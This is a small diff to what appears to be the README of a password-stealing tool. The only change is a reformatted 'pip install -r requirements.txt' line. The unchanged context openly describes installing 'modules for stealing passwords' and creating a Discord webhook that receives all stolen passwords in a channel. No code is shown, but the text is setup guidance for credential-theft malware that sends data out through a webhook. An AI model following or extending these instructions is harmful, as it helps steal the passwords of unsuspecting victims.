@@ -2,7 +2,7 @@
 
 
 To start with, we need to install all the necessary modules for stealing passwords.
-`pip install -r requirements.txt`
+```pip install -r requirements.txt```
 
 The next step is to create a webhooks discord on any server. It is with this webhooks that all stolen passwords will be written in the channel.
 
